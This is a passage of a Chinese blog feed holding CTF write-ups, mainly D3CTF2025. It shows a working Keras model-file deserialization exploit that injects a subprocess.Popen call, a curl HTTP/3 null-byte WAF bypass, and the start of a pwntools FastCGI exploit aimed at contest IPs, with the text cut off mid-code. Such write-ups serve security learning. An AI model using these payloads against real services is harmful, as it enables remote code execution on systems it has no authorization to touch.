class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 网络请求错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 处理请求时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🎯 简化版Flag获取工具&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🔧 目标UUID: 9d5ec98c-5848-4450-9e58-9f97b6b3b7bc&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    flag = get_flag()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n🎊 任务完成!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🏆 最终Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n❌ 未能获取Flag&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;🤔 建议检查:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  - 网络连接是否正常&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  - 服务器是否可访问&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  - UUID是否正确&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  - JWT密钥是否正确&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">很有教学意义的题目</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF2025</title>
    <link href="https://baozongwi.xyz/posts/9ef0df3f.html"/>
    <id>https://baozongwi.xyz/posts/9ef0df3f.html</id>
    <published>2025-05-30T13:50:09.000Z</published>
    <updated>2025-08-08T04:01:00.503Z</updated>
    
    <content type="html"><![CDATA[<h2 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a><strong>d3model</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以进行反序列化RCE，文章 <a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a>  直接用花哥的exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">model_name=<span class="string">&quot;model.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span>*<span class="number">28</span>)  </span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>) </span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span>*<span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config=json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line">    </span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>]=<span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>]=<span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>]=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:<span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:<span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>:<span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>:<span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>:[&#123;<span class="string">&quot;args&quot;</span>:[[<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;env&gt;/app/index.html&quot;</span>]],<span class="string">&quot;kwargs&quot;</span>:&#123;<span class="string">&quot;bufsize&quot;</span>:-<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">            <span class="string">&quot;input_layers&quot;</span>:[[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">            <span class="string">&quot;output_layers&quot;</span>:[[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>,model_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        zf.writestr(<span class="string">&quot;config.json&quot;</span>,json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a><strong>tidy quic</strong></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/libp2p/go-buffer-pool&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/quic-go/quic-go/http3&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p pool.BufferPool</span><br><span class="line"><span class="keyword">var</span> ErrWAF = errors.New(<span class="string">&quot;WAF&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">err := http.ListenAndServeTLS(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">err := http3.ListenAndServeQUIC(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> mux <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*mux)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line"><span class="keyword">if</span> r.Method == http.MethodGet &#123;</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello D^3CTF 2025,I&#x27;m tidy quic in web.&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">w.WriteHeader(<span class="number">400</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf []<span class="type">byte</span></span><br><span class="line">length := <span class="type">int</span>(r.ContentLength)</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">-1</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, ErrWAF) &#123;</span><br><span class="line">w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">buf = p.Get(length)</span><br><span class="line"><span class="keyword">defer</span> p.Put(buf)</span><br><span class="line">rd := textInterrupterWrap(r.Body)</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">n, err := rd.Read(buf[i:])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, io.EOF) &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, ErrWAF) &#123;</span><br><span class="line">w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i += n</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !bytes.HasPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)) &#123;</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Sorry I&#x27;m not clear what you want.&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">item := bytes.TrimSpace(bytes.TrimPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)))</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(item, []<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_, _ = w.Write(item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> wrap <span class="keyword">struct</span> &#123;</span><br><span class="line">io.ReadCloser</span><br><span class="line">ban []<span class="type">byte</span></span><br><span class="line">idx <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *wrap)</span></span> Read(p []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">n, err := w.ReadCloser.Read(p)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, io.EOF) &#123;</span><br><span class="line"><span class="keyword">return</span> n, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> p[i] == w.ban[w.idx] &#123;</span><br><span class="line">w.idx++</span><br><span class="line"><span class="keyword">if</span> w.idx == <span class="built_in">len</span>(w.ban) &#123;</span><br><span class="line"><span class="keyword">return</span> n, ErrWAF</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">w.idx = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">textInterrupterWrap</span><span class="params">(rc io.ReadCloser)</span></span> io.ReadCloser &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;wrap&#123;</span><br><span class="line">rc, []<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>), <span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>起初我看到这题，我以为要进行请求走私，一直在搜索这个框架有没有类似的NDAY然后再进行修改来绕过，但是没找到相关资料，我们的目标就是POST一个<code>I want flag</code>但是后续内容如果被提取成flag就会寄，后面发现用<code>\0</code>绕过即可，使用curl进行http3请求会比较方便，当然你也可以写python脚本，看自己选择了  <a href="https://curl.se/windows/">https://curl.se/windows/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=$<span class="string">&#x27;I want \0flag&#x27;</span></span><br><span class="line">curl -X POST https://35.241.98.126:31956 -d <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -v --insecure --http3 -H <span class="string">&quot;Content-Length: 11&quot;</span></span><br></pre></td></tr></table></figure><h2 id="d3cgi"><a href="#d3cgi" class="headerlink" title="d3cgi"></a><strong>d3cgi</strong></h2><p><a href="https://www.synacktiv.com/publications/cve-2025-23016-exploiter-la-bibliotheque-fastcgi.html#exploitation">https://www.synacktiv.com/publications/cve-2025-23016-exploiter-la-bibliotheque-fastcgi.html#exploitation</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&quot;35.220.136.70&quot;</span>,<span class="number">30369</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    unsigned char version;</span></span><br><span class="line"><span class="string">    unsigned char type;</span></span><br><span class="line"><span class="string">    unsigned char requestIdB1;</span></span><br><span class="line"><span class="string">    unsigned char requestIdB0;</span></span><br><span class="line"><span class="string">    unsigned char contentLengthB1;</span></span><br><span class="line"><span class="string">    unsigned char contentLengthB0;</span></span><br><span class="line"><span class="string">    unsigned char paddingLength;</span></span><br><span class="line"><span class="string">    unsigned char reserved;</span></span><br><span class="line"><span class="string">&#125; FCGI_Header;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeHeader</span>(<span class="params"><span class="built_in">type</span>, requestId, contentLength, paddingLength</span>):</span><br><span class="line">    header = p8(<span class="number">1</span>) + p8(<span class="built_in">type</span>) + p16(requestId) + p16(contentLength)[::-<span class="number">1</span>] + p8(paddingLength) + p8(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    unsigned char roleB1;</span></span><br><span class="line"><span class="string">    unsigned char roleB0;</span></span><br><span class="line"><span class="string">    unsigned char flags;</span></span><br><span class="line"><span class="string">    unsigned char reserved[5];</span></span><br><span class="line"><span class="string">&#125; FCGI_BeginRequestBody;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeBeginReqBody</span>(<span class="params">role, flags</span>):</span><br><span class="line">    <span class="keyword">return</span> p16(role)[::-<span class="number">1</span>] + p8(flags) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">header = makeHeader(<span class="number">9</span>, <span class="number">0</span>, <span class="number">900</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(exe.plt[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">io.send(makeHeader(<span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span 